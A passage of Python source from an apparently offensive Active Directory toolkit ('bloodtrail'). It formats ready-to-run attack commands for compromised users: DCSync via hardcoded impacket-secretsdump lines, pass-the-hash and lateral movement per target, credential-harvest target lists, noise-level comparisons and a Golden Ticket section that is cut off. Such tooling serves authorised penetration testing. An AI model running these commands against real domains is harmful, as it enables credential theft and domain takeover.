"""
Blood-trail DRY Command Display

Tabular display functions for attack command suggestions.
Shows template ONCE, then lists targets in compact table format.
"""

from typing import List, Dict, Optional
from .command_suggester import CommandTable, TargetEntry, AttackSequence
from .command_mappings import ACCESS_TYPE_PHASES


class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'


def print_command_tables(
    tables: List[CommandTable],
    use_colors: bool = True,
    max_targets: int = 20
) -> None:
    """
    Print DRY tabular output for command tables.

    Each command shows:
    - Name + access type badge
    - Template (shown ONCE)
    - Variables needed (if any)
    - Table of targets with ready-to-run commands

    Args:
        tables: List of CommandTable objects
        use_colors: Enable ANSI colors
        max_targets: Maximum targets to show per table
    """
    c = Colors if use_colors else _NoColors

    for table in tables:
        if not table.targets:
            continue

        # Access type badge
        badge = f"[{table.access_type}]" if table.access_type else ""

        # Header: Command name + badge
        print(f"\n{c.BOLD}{table.name}{c.RESET} {c.CYAN}{badge}{c.RESET}")

        # Objective (what the command achieves)
        if table.objective:
            print(f"Objective: {table.objective}")

        # Rewards (practical application)
        if table.rewards:
            print(f"Rewards:   {c.YELLOW}{table.rewards}{c.RESET}")

        # Template (shown ONCE)
        print(f"{c.DIM}Template:  {table.template}{c.RESET}")

        # Example (if available and different from template)
        if table.example and table.example != table.template:
            print(f"{c.GREEN}Example:   {table.example}{c.RESET}")

        # Variables needed
        if table.variables_needed:
            print(f"{c.YELLOW}Need: {', '.join(table.variables_needed)}{c.RESET}")

        # Permissions required (new field)
        if table.permissions_required:
            print(f"{c.CYAN}Requires: {table.permissions_required}{c.RESET}")

        # Table header - adjust columns based on command type
        if table.is_discovery:
            # Discovery commands find targets, attacker provides their own creds
            print(f"\n  {'Discovered':<25} {'Domain':<20} {'Info':<40} {'Ready Command'}")
        elif table.is_coercion:
            # Coercion commands: listener is unconstrained host, target is what we coerce
            print(f"\n  {'Listener (Unconstrained)':<25} {'Coerce Target':<20} {'Reason':<40} {'Ready Command'}")
        else:
            print(f"\n  {'User':<25} {'Target':<20} {'Reason':<40} {'Ready Command'}")
        print(f"  {'-'*25} {'-'*20} {'-'*40} {'-'*50}")

        # Target rows
        displayed = 0
        for entry in table.targets[:max_targets]:
            user_short = _truncate(entry.user, 23)
            target_short = _truncate(entry.target, 18)

            # Build reason with warnings prefix
            warning_str = " ".join(entry.warnings) if entry.warnings else ""
            if warning_str:
                reason_display = f"{c.RED}{warning_str}{c.RESET} {entry.reason}"
                reason_short = _truncate(f"{warning_str} {entry.reason}", 38)
            else:
                reason_display = entry.reason
                reason_short = _truncate(entry.reason, 38) if entry.reason else ""

            # Color reason yellow, but warnings are red (handled above)
            if warning_str:
                print(f"  {user_short:<25} {target_short:<20} {c.RED}{_truncate(warning_str, 15):<16}{c.RESET}{c.YELLOW}{_truncate(entry.reason, 22):<24}{c.RESET} {c.GREEN}{entry.ready_command}{c.RESET}")
            else:
                print(f"  {user_short:<25} {target_short:<20} {c.YELLOW}{reason_short:<40}{c.RESET} {c.GREEN}{entry.ready_command}{c.RESET}")
            displayed += 1

        # Show truncation notice
        if len(table.targets) > max_targets:
            remaining = len(table.targets) - max_targets
            print(f"  {c.DIM}... and {remaining} more targets{c.RESET}")

        print()  # Spacing between tables


def print_command_tables_by_phase(
    tables: List[CommandTable],
    use_colors: bool = True
) -> None:
    """
    Print command tables grouped by attack phase.

    Phases:
    - Quick Wins
    - Lateral Movement
    - Privilege Escalation
    """
    c = Colors if use_colors else _NoColors

    # Group by phase
    phases = {
        "Quick Wins": [],
        "Lateral Movement": [],
        "Privilege Escalation": [],
        "Other": [],
    }

    for table in tables:
        if not table.targets:
            continue
        phase = table.phase
        if phase not in phases:
            phase = "Other"
        phases[phase].append(table)

    # Print each phase
    for phase_name, phase_tables in phases.items():
        if not phase_tables:
            continue

        # Phase header
        print(f"\n{c.BOLD}{c.CYAN}{'='*70}")
        print(f"  {phase_name.upper()}")
        print(f"{'='*70}{c.RESET}")

        print_command_tables(phase_tables, use_colors)


def print_domain_level_table(
    table: CommandTable,
    principals: List[str],
    use_colors: bool = True
) -> None:
    """
    Print domain-level command (DCSync, etc.) with both formats:
    1. Single ready command template
    2. Expandable list of principals with this right

    Args:
        table: CommandTable for domain-level command
        principals: List of principals with this right (not groups)
        use_colors: Enable ANSI colors
    """
    c = Colors if use_colors else _NoColors

    print(f"\n{c.BOLD}{table.name}{c.RESET} {c.CYAN}[{table.access_type}]{c.RESET}")

    # Objective (what the command achieves)
    if table.objective:
        print(f"Objective: {table.objective}")

    # Rewards (practical application)
    if table.rewards:
        print(f"Rewards:   {c.YELLOW}{table.rewards}{c.RESET}")

    print(f"{c.DIM}Template:  {table.template}{c.RESET}")

    # Example (if available and different from template)
    if table.example and table.example != table.template:
        print(f"{c.GREEN}Example:   {table.example}{c.RESET}")

    if table.variables_needed:
        print(f"{c.YELLOW}Need: {', '.join(table.variables_needed)}{c.RESET}")

    print(f"{c.DIM}Access: Domain-level{c.RESET}")

    # Single ready command (example)
    if table.targets:
        print(f"\n  {c.GREEN}Ready: {table.targets[0].ready_command}{c.RESET}")

    # Principals with this right
    if principals:
        print(f"\n  Principals with DCSync rights:")
        print(f"  {c.DIM}{'+'*40}{c.RESET}")
        for p in principals[:10]:
            print(f"  {c.DIM}|{c.RESET} {p}")
        if len(principals) > 10:
            print(f"  {c.DIM}| ... and {len(principals) - 10} more{c.RESET}")
        print(f"  {c.DIM}{'+'*40}{c.RESET}")

    print()


def format_table_markdown(table: CommandTable) -> str:
    """
    Format CommandTable as markdown for report output.

    Returns:
        Markdown string
    """
    lines = []

    badge = f"[{table.access_type}]" if table.access_type else ""
    lines.append(f"### {table.name} {badge}")
    lines.append("")

    if table.objective:
        lines.append(f"**Objective:** {table.objective}")

    if table.rewards:
        lines.append(f"**Rewards:** {table.rewards}")

    lines.append(f"**Template:** `{table.template}`")

    if table.example and table.example != table.template:
        lines.append(f"**Example:** `{table.example}`")

    if table.variables_needed:
        lines.append(f"**Need:** {', '.join(table.variables_needed)}")

    if table.permissions_required:
        lines.append(f"**Requires:** {table.permissions_required}")

    lines.append("")
    # Adjust column headers for discovery commands
    if table.is_discovery:
        lines.append("| Discovered | Domain | Warnings | Info | Ready Command |")
    else:
        lines.append("| User | Target | Warnings | Reason | Ready Command |")
    lines.append("|------|--------|----------|--------|---------------|")

    for entry in table.targets[:20]:
        user_safe = entry.user.replace("|", "\\|")
        target_safe = entry.target.replace("|", "\\|")
        warnings_safe = " ".join(entry.warnings).replace("|", "\\|") if entry.warnings else ""
        reason_safe = (entry.reason or "").replace("|", "\\|")
        cmd_safe = entry.ready_command.replace("|", "\\|")
        lines.append(f"| {user_safe} | {target_safe} | {warnings_safe} | {reason_safe} | `{cmd_safe}` |")

    if len(table.targets) > 20:
        lines.append(f"| ... | ... | ... | ... | *{len(table.targets) - 20} more* |")

    lines.append("")
    return "\n".join(lines)


def format_tables_markdown(tables: List[CommandTable]) -> str:
    """Format all command tables as markdown grouped by phase"""
    lines = ["## Attack Commands", ""]

    # Group by phase
    phases = {"Quick Wins": [], "Lateral Movement": [], "Privilege Escalation": [], "Other": []}
    for table in tables:
        if table.targets:
            phase = table.phase if table.phase in phases else "Other"
            phases[phase].append(table)

    for phase_name, phase_tables in phases.items():
        if not phase_tables:
            continue
        lines.append(f"### {phase_name}")
        lines.append("")
        for table in phase_tables:
            lines.append(format_table_markdown(table))

    return "\n".join(lines)


def get_table_stats(tables: List[CommandTable]) -> Dict:
    """Get statistics about command tables"""
    total_commands = len(tables)
    total_targets = sum(len(t.targets) for t in tables)

    by_phase = {}
    for table in tables:
        phase = table.phase
        if phase not in by_phase:
            by_phase[phase] = {"commands": 0, "targets": 0}
        by_phase[phase]["commands"] += 1
        by_phase[phase]["targets"] += len(table.targets)

    return {
        "total_commands": total_commands,
        "total_targets": total_targets,
        "by_phase": by_phase,
    }


def print_stats(tables: List[CommandTable], use_colors: bool = True) -> None:
    """Print summary statistics"""
    c = Colors if use_colors else _NoColors
    stats = get_table_stats(tables)

    print(f"{c.DIM}Commands: {stats['total_commands']} | Targets: {stats['total_targets']}{c.RESET}")

    for phase, data in stats["by_phase"].items():
        print(f"  {phase}: {data['commands']} commands, {data['targets']} targets")


# =============================================================================
# POST-SUCCESS SUGGESTIONS
# =============================================================================

def print_post_success(
    post_success: List[Dict],
    domain: str = "",
    dc_ip: str = "<DC_IP>",
    use_colors: bool = True
) -> None:
    """
    Print post-success suggestions after command tables.

    Shows "When You Succeed" next steps for discovery commands
    like Kerberoasting, AS-REP roasting, etc.

    Args:
        post_success: List of {"description": str, "command": str|None}
        domain: Domain for placeholder replacement
        dc_ip: DC IP for placeholder replacement
        use_colors: Enable ANSI colors
    """
    if not post_success:
        return

    c = Colors if use_colors else _NoColors

    print(f"\n  {c.DIM}─── When You Succeed ───────────────────────────────{c.RESET}")

    for i, step in enumerate(post_success, 1):
        desc = step.get("description", "")
        cmd = step.get("command")

        print(f"  {c.CYAN}{i}.{c.RESET} {desc}")
        if cmd:
            # Fill domain/DC placeholders
            cmd = cmd.replace("<DOMAIN>", domain.lower() if domain else "<DOMAIN>")
            cmd = cmd.replace("<DC_IP>", dc_ip)
            print(f"     {c.GREEN}{cmd}{c.RESET}")

    print()


# =============================================================================
# PWNED USER DISPLAY FUNCTIONS
# =============================================================================

def print_technique_legend(techniques: List, c) -> None:
    """
    Print comparison table for lateral movement techniques.

    Shows noise level, ports, advantages, and disadvantages for each technique.
    """
    if not techniques:
        return

    # Table dimensions
    w_tech = 10
    w_noise = 6
    w_ports = 7
    w_adv = 28
    w_dis = 24
    total_w = w_tech + w_noise + w_ports + w_adv + w_dis + 6  # +6 for separators

    # Noise level colors
    noise_colors = {"high": c.RED, "medium": c.YELLOW, "low": c.GREEN}

    print()
    print(f"  {c.DIM}┌{'─' * total_w}┐{c.RESET}")
    print(f"  {c.DIM}│{c.RESET} {c.BOLD}Technique Comparison{c.RESET}{' ' * (total_w - 21)}{c.DIM}│{c.RESET}")
    print(f"  {c.DIM}├{'─' * w_tech}┬{'─' * w_noise}┬{'─' * w_ports}┬{'─' * w_adv}┬{'─' * w_dis}┤{c.RESET}")
    print(f"  {c.DIM}│{c.RESET}{'Technique':^{w_tech}}{c.DIM}│{c.RESET}{'Noise':^{w_noise}}{c.DIM}│{c.RESET}{'Ports':^{w_ports}}{c.DIM}│{c.RESET}{'Advantages':^{w_adv}}{c.DIM}│{c.RESET}{'Disadvantages':^{w_dis}}{c.DIM}│{c.RESET}")
    print(f"  {c.DIM}├{'─' * w_tech}┼{'─' * w_noise}┼{'─' * w_ports}┼{'─' * w_adv}┼{'─' * w_dis}┤{c.RESET}")

    for tech in techniques:
        name = tech.name.split()[0].lower()
        noise = tech.noise_level.upper()[:4]
        noise_c = noise_colors.get(tech.noise_level, "")
        ports = ",".join(str(p) for p in tech.ports)

        # Truncate long text
        adv = tech.advantages[:w_adv-2] + ".." if len(tech.advantages) > w_adv else tech.advantages
        dis = tech.disadvantages[:w_dis-2] + ".." if len(tech.disadvantages) > w_dis else tech.disadvantages

        print(f"  {c.DIM}│{c.RESET}{name:^{w_tech}}{c.DIM}│{c.RESET}{noise_c}{noise:^{w_noise}}{c.RESET}{c.DIM}│{c.RESET}{ports:^{w_ports}}{c.DIM}│{c.RESET}{adv:<{w_adv}}{c.DIM}│{c.RESET}{dis:<{w_dis}}{c.DIM}│{c.RESET}")

    print(f"  {c.DIM}└{'─' * w_tech}┴{'─' * w_noise}┴{'─' * w_ports}┴{'─' * w_adv}┴{'─' * w_dis}┘{c.RESET}")


def _generate_technique_legend_console(techniques: List, c) -> str:
    """Generate technique comparison table for console output (string version)."""
    if not techniques:
        return ""

    lines = []
    w_tech, w_noise, w_ports, w_adv, w_dis = 10, 6, 7, 28, 24
    total_w = w_tech + w_noise + w_ports + w_adv + w_dis + 6

    noise_colors = {"high": c.RED, "medium": c.YELLOW, "low": c.GREEN}

    lines.append("")
    lines.append(f"  {c.DIM}┌{'─' * total_w}┐{c.RESET}")
    lines.append(f"  {c.DIM}│{c.RESET} {c.BOLD}Technique Comparison{c.RESET}{' ' * (total_w - 21)}{c.DIM}│{c.RESET}")
    lines.append(f"  {c.DIM}├{'─' * w_tech}┬{'─' * w_noise}┬{'─' * w_ports}┬{'─' * w_adv}┬{'─' * w_dis}┤{c.RESET}")
    lines.append(f"  {c.DIM}│{c.RESET}{'Technique':^{w_tech}}{c.DIM}│{c.RESET}{'Noise':^{w_noise}}{c.DIM}│{c.RESET}{'Ports':^{w_ports}}{c.DIM}│{c.RESET}{'Advantages':^{w_adv}}{c.DIM}│{c.RESET}{'Disadvantages':^{w_dis}}{c.DIM}│{c.RESET}")
    lines.append(f"  {c.DIM}├{'─' * w_tech}┼{'─' * w_noise}┼{'─' * w_ports}┼{'─' * w_adv}┼{'─' * w_dis}┤{c.RESET}")

    for tech in techniques:
        name = tech.name.split()[0].lower()
        noise = tech.noise_level.upper()[:4]
        noise_c = noise_colors.get(tech.noise_level, "")
        ports = ",".join(str(p) for p in tech.ports)
        adv = tech.advantages[:w_adv-2] + ".." if len(tech.advantages) > w_adv else tech.advantages
        dis = tech.disadvantages[:w_dis-2] + ".." if len(tech.disadvantages) > w_dis else tech.disadvantages
        lines.append(f"  {c.DIM}│{c.RESET}{name:^{w_tech}}{c.DIM}│{c.RESET}{noise_c}{noise:^{w_noise}}{c.RESET}{c.DIM}│{c.RESET}{ports:^{w_ports}}{c.DIM}│{c.RESET}{adv:<{w_adv}}{c.DIM}│{c.RESET}{dis:<{w_dis}}{c.DIM}│{c.RESET}")

    lines.append(f"  {c.DIM}└{'─' * w_tech}┴{'─' * w_noise}┴{'─' * w_ports}┴{'─' * w_adv}┴{'─' * w_dis}┘{c.RESET}")
    return "\n".join(lines)


def _generate_technique_legend_markdown(techniques: List) -> str:
    """Generate technique comparison table as markdown."""
    if not techniques:
        return ""

    lines = []
    lines.append("")
    lines.append("**Technique Comparison**")
    lines.append("")
    lines.append("| Technique | Noise | Ports | Advantages | Disadvantages |")
    lines.append("|-----------|-------|-------|------------|---------------|")

    for tech in techniques:
        name = tech.name.split()[0].lower()
        noise = tech.noise_level.upper()
        ports = ",".join(str(p) for p in tech.ports)
        lines.append(f"| {name} | {noise} | {ports} | {tech.advantages} | {tech.disadvantages} |")

    lines.append("")
    return "\n".join(lines)


def print_pwned_followup_commands(
    user_name: str,
    cred_type: str = None,
    cred_value: str = None,
    access: List = None,  # List[MachineAccess]
    domain_level_access: str = None,
    use_colors: bool = True,
    cred_types: List[str] = None,
    cred_values: List[str] = None,
    dc_ip: str = None,
    dc_hostname: str = None,
    domain_sid: str = None,
) -> None:
    """
    Print follow-up commands after marking a user as pwned.

    Commands are auto-filled with stored credential values.
    Shows ALL available techniques per target for easy copy-paste.
    Supports multiple credential types per user.

    Args:
        user_name: User UPN (USER@DOMAIN.COM)
        cred_type: Single credential type (backward compat, use cred_types instead)
        cred_value: Single credential value (backward compat, use cred_values instead)
        access: List of MachineAccess objects
        domain_level_access: 'domain-admin' if user has DA-level rights
        use_colors: Enable ANSI colors
        cred_types: List of credential types (password, ntlm-hash, etc.)
        cred_values: List of corresponding credential values (parallel arrays)
        dc_ip: Domain Controller IP address (stored in bloodtrail config)
        dc_hostname: Domain Controller hostname (stored or auto-detected)
    """
    from .command_mappings import (
        CRED_TYPE_TEMPLATES,
        LATERAL_TECHNIQUES,
        fill_pwned_command,
        infer_dc_hostname,
        get_techniques_for_access,
    )

    c = Colors if use_colors else _NoColors
    access = access or []

    # Handle backward compatibility: single cred_type/cred_value -> arrays
    if cred_types is None:
        cred_types = [cred_type] if cred_type else ["password"]
    if cred_values is None:
        cred_values = [cred_value] if cred_value else [""]

    # Extract username and domain
    if "@" in user_name:
        username, domain = user_name.split("@")
    else:
        username = user_name
        domain = ""

    # Use primary credential for main command generation
    primary_cred_type = cred_types[0] if cred_types else "password"
    primary_cred_value = cred_values[0] if cred_values else ""

    # Determine DC target - use stored config or infer from domain
    dc_target = dc_hostname or dc_ip or infer_dc_hostname(domain)

    # Header
    print()
    print(f"{c.BOLD}{'='*70}{c.RESET}")
    print(f"  {c.CYAN}FOLLOW-UP COMMANDS{c.RESET} ({c.BOLD}{user_name}{c.RESET})")
    print(f"{'='*70}")

    # Show all credentials
    if len(cred_types) > 1:
        creds_display = ", ".join(f"{c.YELLOW}{ct}{c.RESET}" for ct in cred_types)
        print(f"  Credentials: {creds_display}")
    else:
        print(f"  Credential: {c.YELLOW}{primary_cred_type}{c.RESET} (stored - auto-filled)")
    print()

    # Domain-level access (DCSync)
    if domain_level_access == "domain-admin":
        print(f"👑 {c.RED}{c.BOLD}DOMAIN ADMIN ACCESS{c.RESET} [DCSync]")
        print()
        print(f"  {'Attack':<22} {'Reason':<40} {'Ready Command'}")
        print(f"  {'-'*22} {'-'*40} {'-'*60}")
        template = CRED_TYPE_TEMPLATES.get(primary_cred_type, {}).get("DCSync")
        if template:
            cmd = fill_pwned_command(
                template,
                username=username,
                domain=domain,
                target=dc_target,
                cred_value=primary_cred_value,
                dc_ip=dc_ip
            )
            print(
                f"  {c.BOLD}{'DCSync':<22}{c.RESET} "
                f"{c.YELLOW}{'Member of Domain Admins':<40}{c.RESET} "
                f"{c.GREEN}{cmd}{c.RESET}"
            )
        print()

    # Group access by privilege level
    admin_access = [a for a in access if a.privilege_level == "local-admin"]
    user_access = [a for a in access if a.privilege_level == "user-level"]
    dcom_access = [a for a in access if a.privilege_level == "dcom-exec"]

    # Credential type display names
    CRED_TYPE_LABELS = {
        "password": "password",
        "ntlm-hash": "ntlm-hash (Pass-the-Hash)",
        "kerberos-ticket": "kerberos-ticket (Pass-the-Ticket)",
        "certificate": "certificate",
    }

    # Local Admin access - per-target technique list, grouped by credential type
    if admin_access:
        print(f"🩸 {c.RED}{c.BOLD}LOCAL ADMIN ACCESS{c.RESET} ({len(admin_access)} machines)")

        priority_targets = []
        techniques = get_techniques_for_access("AdminTo")

        # Generate commands for each credential type
        for cred_idx, (ct, cv) in enumerate(zip(cred_types, cred_values)):
            print()
            label = CRED_TYPE_LABELS.get(ct, ct)
            print(f"  {c.CYAN}Using: {label}{c.RESET}")
            print()

            for ma in admin_access[:10]:  # Limit to first 10
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")

                # Show all available techniques for this target
                for tech in techniques:
                    template = tech.command_templates.get(ct)
                    if template:
                        cmd = fill_pwned_command(
                            template,
                            username=username,
                            domain=domain,
                            target=ma.computer,
                            cred_value=cv,
                            target_ip=ma.computer_ip or ""
                        )
                        # Short name for technique
                        tech_short = tech.name.split()[0].lower()
                        print(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")

                # Track priority targets with sessions (only on first cred type)
                if cred_idx == 0 and ma.sessions:
                    priority_targets.append((ma, ma.sessions))

                print()  # Space between targets

            if len(admin_access) > 10:
                print(f"  {c.DIM}... and {len(admin_access) - 10} more machines{c.RESET}")

        # Priority targets with sessions (secretsdump) - show for primary credential
        if priority_targets:
            print()
            print(f"  {c.YELLOW}⚠ PRIORITY TARGETS (privileged sessions detected){c.RESET}")
            print()

            for ma, sessions in priority_targets[:5]:
                sessions_str = ", ".join(sessions[:2])
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")
                print(f"    {c.YELLOW}Sessions: {sessions_str}{c.RESET}")

                # Show secretsdump for each credential type
                for ct, cv in zip(cred_types, cred_values):
                    sd_template = CRED_TYPE_TEMPLATES.get(ct, {}).get("secretsdump")
                    if sd_template:
                        sd_cmd = fill_pwned_command(
                            sd_template,
                            username=username,
                            domain=domain,
                            target=ma.computer,
                            cred_value=cv,
                            target_ip=ma.computer_ip or ""
                        )
                        label_short = "PtH" if ct == "ntlm-hash" else ct[:4]
                        print(f"    {c.DIM}secretsdump ({label_short}):{c.RESET}  {c.GREEN}{sd_cmd}{c.RESET}")
                print()

        # Show technique comparison legend
        print_technique_legend(techniques, c)

    # User-level access (RDP, PSRemote) - per-target technique list
    if user_access:
        print(f"🔵 {c.BLUE}{c.BOLD}USER-LEVEL ACCESS{c.RESET} ({len(user_access)} machines)")

        # Generate commands for each credential type
        for ct, cv in zip(cred_types, cred_values):
            print()
            label = CRED_TYPE_LABELS.get(ct, ct)
            print(f"  {c.CYAN}Using: {label}{c.RESET}")
            print()

            for ma in user_access[:10]:
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")

                # Show techniques based on access types
                for access_type in ma.access_types:
                    if access_type in ("CanRDP", "CanPSRemote"):
                        techniques = get_techniques_for_access(access_type)
                        for tech in techniques:
                            template = tech.command_templates.get(ct)
                            if template:
                                cmd = fill_pwned_command(
                                    template,
                                    username=username,
                                    domain=domain,
                                    target=ma.computer,
                                    cred_value=cv,
                                    target_ip=ma.computer_ip or ""
                                )
                                tech_short = tech.name.split()[0].lower()
                                print(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")

                print()  # Space between targets

            if len(user_access) > 10:
                print(f"  {c.DIM}... and {len(user_access) - 10} more machines{c.RESET}")

    # DCOM access - per-target technique list
    if dcom_access:
        print(f"\n⚙️  {c.BLUE}{c.BOLD}DCOM ACCESS{c.RESET} ({len(dcom_access)} machines)")

        techniques = get_techniques_for_access("ExecuteDCOM")

        # Generate commands for each credential type
        for ct, cv in zip(cred_types, cred_values):
            print()
            label = CRED_TYPE_LABELS.get(ct, ct)
            print(f"  {c.CYAN}Using: {label}{c.RESET}")
            print()

            for ma in dcom_access[:5]:
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")

                for tech in techniques:
                    template = tech.command_templates.get(ct)
                    if template:
                        cmd = fill_pwned_command(
                            template,
                            username=username,
                            domain=domain,
                            target=ma.computer,
                            cred_value=cv,
                            target_ip=ma.computer_ip or ""
                        )
                        tech_short = tech.name.split()[0].lower()
                        print(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")

                print()

    # No edge-based access found
    if not admin_access and not user_access and not dcom_access and not domain_level_access:
        print(f"  {c.DIM}No direct machine access via AdminTo/CanRDP/CanPSRemote edges.{c.RESET}")
        print()

    print(f"{'='*70}")

    # Auto-show post-exploitation commands if user has local-admin or domain-admin access
    has_local_admin = any(a.privilege_level == "local-admin" for a in access)
    if has_local_admin or domain_level_access:
        print_post_exploit_commands(
            user_name=user_name,
            access=access,
            domain_level_access=domain_level_access,
            cred_types=cred_types,
            cred_values=cred_values,
            dc_ip=dc_ip,
            domain_sid=domain_sid,
            use_colors=use_colors,
        )

    # Show authenticated user attacks ONCE at the bottom (template form)
    # These are generic - same for any domain user
    print_authenticated_attacks_template(use_colors=use_colors, dc_ip=dc_ip)


def print_pwned_users_table(
    users: List,  # List[PwnedUser]
    use_colors: bool = True
) -> None:
    """
    Print a table of all pwned users with their access summary.

    Args:
        users: List of PwnedUser objects
        use_colors: Enable ANSI colors
    """
    c = Colors if use_colors else _NoColors

    if not users:
        print(f"{c.DIM}No pwned users tracked.{c.RESET}")
        print(f"{c.DIM}Mark a user as pwned: bloodtrail --pwn USER@DOMAIN.COM --cred-type password --cred-value 'secret'{c.RESET}")
        return

    # Header
    print()
    print(f"{c.BOLD}{'='*90}{c.RESET}")
    print(f"  {c.CYAN}PWNED USERS{c.RESET} ({len(users)} total)")
    print(f"{'='*90}")
    print()

    # Table header
    print(f"  {'User':<30} {'Cred Type':<15} {'Admin On':<10} {'User On':<10} {'Domain?':<8} {'Pwned At'}")
    print(f"  {'-'*30} {'-'*15} {'-'*10} {'-'*10} {'-'*8} {'-'*20}")

    for user in users:
        # Count access by type
        admin_count = sum(1 for a in user.access if a.privilege_level == "local-admin")
        user_count = sum(1 for a in user.access if a.privilege_level == "user-level")
        domain_marker = "YES" if user.domain_level_access == "domain-admin" else "-"

        # Format timestamp
        pwned_at_str = user.pwned_at.strftime("%Y-%m-%d %H:%M")

        # Color based on privilege level
        if user.domain_level_access == "domain-admin":
            name_color = c.RED
        elif admin_count > 0:
            name_color = c.YELLOW
        else:
            name_color = c.RESET

        # Show credential types (comma-separated if multiple)
        cred_display = ",".join(user.cred_types) if user.cred_types else "password"
        if len(cred_display) > 15:
            cred_display = cred_display[:12] + "..."

        print(f"  {name_color}{user.name:<30}{c.RESET} {cred_display:<15} {admin_count:<10} {user_count:<10} {domain_marker:<8} {pwned_at_str}")

    print()
    print(f"{c.DIM}Run: bloodtrail --pwn USER -v  to see detailed access for a user{c.RESET}")
    print()


def print_cred_harvest_targets(
    targets: List[Dict],
    use_colors: bool = True
) -> None:
    """
    Print high-priority credential harvest targets.

    These are machines where pwned users have admin AND privileged users have sessions.

    Args:
        targets: List of dicts with pwned_user, target, privileged_sessions
        use_colors: Enable ANSI colors
    """
    from .command_mappings import CRED_TYPE_TEMPLATES, fill_pwned_command

    c = Colors if use_colors else _NoColors

    if not targets:
        print(f"{c.DIM}No high-priority credential harvest targets found.{c.RESET}")
        return

    print()
    print(f"{c.RED}{c.BOLD}{'='*70}{c.RESET}")
    print(f"  {c.RED}PRIORITY CREDENTIAL HARVEST TARGETS{c.RESET}")
    print(f"{c.RED}{'='*70}{c.RESET}")
    print()

    for t in targets[:10]:
        user = t["pwned_user"]
        target = t["target"]
        sessions = t["privileged_sessions"]
        cred_type = t.get("cred_type", "password")
        cred_value = t.get("cred_value", "<PASSWORD>")

        # Extract username/domain
        if "@" in user:
            username, domain = user.split("@")
        else:
            username, domain = user, ""

        print(f"  {c.BOLD}{target}{c.RESET}")
        print(f"    {c.DIM}Pwned user:{c.RESET} {user} ({cred_type})")
        print(f"    {c.YELLOW}High-value sessions:{c.RESET} {', '.join(sessions[:5])}")

        # Secretsdump command
        template = CRED_TYPE_TEMPLATES.get(cred_type, {}).get("secretsdump")
        if template:
            cmd = fill_pwned_command(
                template,
                username=username,
                domain=domain,
                target=target,
                cred_value=cred_value
            )
            print(f"    {c.GREEN}{cmd}{c.RESET}")
        print()

    if len(targets) > 10:
        print(f"  {c.DIM}... and {len(targets) - 10} more targets{c.RESET}")

    print()


def print_post_exploit_commands(
    user_name: str,
    access: List = None,  # List[MachineAccess]
    domain_level_access: str = None,
    cred_types: List[str] = None,
    cred_values: List[str] = None,
    dc_ip: str = None,
    domain_sid: str = None,
    use_colors: bool = True,
) -> None:
    """
    Display mimikatz post-exploitation recommendations based on privilege level.

    Shows credential harvest order with copy-paste ready commands,
    educational tips for what to look for, and next steps after harvesting.

    Args:
        user_name: User UPN (USER@DOMAIN.COM)
        access: List of MachineAccess objects
        domain_level_access: 'domain-admin' if user has DA-level rights
        cred_types: List of credential types the user has
        cred_values: List of corresponding credential values
        dc_ip: Domain Controller IP address
        domain_sid: Domain SID for Golden/Silver ticket (e.g., S-1-5-21-...)
        use_colors: Enable ANSI colors
    """
    from .command_mappings import (
        get_post_exploit_commands,
        get_harvest_tips,
        get_arg_acquisition,
        CRED_TYPE_TEMPLATES,
        fill_pwned_command,
        infer_dc_hostname,
    )

    c = Colors if use_colors else _NoColors
    access = access or []
    cred_types = cred_types or ["password"]

    # Extract username and domain
    if "@" in user_name:
        username, domain = user_name.split("@")
    else:
        username = user_name
        domain = ""

    # Determine DC target
    dc_target = dc_ip or infer_dc_hostname(domain)

    # Group access by privilege level
    local_admin_targets = [a for a in access if a.privilege_level == "local-admin"]
    session_targets = [a for a in local_admin_targets if a.sessions]

    # Header
    print()
    print(f"{c.CYAN}{'═'*75}{c.RESET}")
    print(f"  {c.BOLD}POST-EXPLOITATION COMMANDS{c.RESET} ({c.YELLOW}{user_name}{c.RESET})")
    print(f"{c.CYAN}{'═'*75}{c.RESET}")

    # =========================================================================
    # STORED CREDENTIALS
    # =========================================================================
    if cred_types and cred_values:
        print()
        print(f"  {c.BOLD}STORED CREDENTIALS{c.RESET}")
        print(f"  {c.DIM}{'─'*70}{c.RESET}")
        for ctype, cval in zip(cred_types, cred_values):
            if cval and cval not in ("<PASSWORD>", "<HASH>", "<TICKET_PATH>"):
                # Format credential type nicely
                ctype_display = ctype.replace("-", " ").title()
                print(f"    {c.DIM}{ctype_display}:{c.RESET}  {c.GREEN}{cval}{c.RESET}")

    # =========================================================================
    # DOMAIN ADMIN SECTION
    # =========================================================================
    if domain_level_access:
        print()
        print(f"  {c.RED}{c.BOLD}DOMAIN ADMIN ACCESS{c.RESET}")
        print(f"  {c.DIM}{'─'*70}{c.RESET}")

        # DCSync - remote preferred
        da_commands = get_post_exploit_commands("domain-admin", "remote_preferred")
        print(f"\n  {c.CYAN}DCSync (remote - safer):{c.RESET}")

        for cmd_tuple in da_commands:
            # Tuples are (cmd_id, description, module, ...)
            description = cmd_tuple[1] if len(cmd_tuple) > 1 else ""

            # Use impacket secretsdump template
            template = "impacket-secretsdump -just-dc '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<DC_IP>"
            if cred_types and cred_types[0] == "ntlm-hash":
                template = "impacket-secretsdump -just-dc -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<DC_IP>"
            cmd = template.replace("<USERNAME>", username).replace("<DOMAIN>", domain.lower())
            cmd = cmd.replace("<DC_IP>", dc_target)
            cmd = cmd.replace("<CRED_VALUE>", "<PASSWORD>" if not cred_types or cred_types[0] == "password" else "<HASH>")
            print(f"    {c.GREEN}{cmd}{c.RESET}")
            print(f"    {c.DIM}→ {description}{c.RESET}")

        # Golden Ticket (after obtaining krbtgt hash)
        print(f"\n  {c.CYAN}Golden Ticket (after obtaining krbtgt hash):{c.RESET}")
        sid_value = domain_sid if domain_sid else "<SID>"
